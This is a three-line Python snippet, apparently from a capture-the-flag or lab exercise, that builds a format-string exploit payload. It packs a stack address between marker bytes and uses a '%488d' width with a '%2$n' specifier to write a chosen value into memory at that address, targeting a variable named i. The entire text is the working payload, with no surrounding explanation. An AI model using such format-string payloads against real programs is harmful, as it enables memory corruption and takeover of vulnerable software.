#Change bytes between AAAA and BBBB to bytes of the address where i is
payload = b'AAAA\x80\xd6\xff\xffBBBB%488d' + b'%2$n'
print(payload)
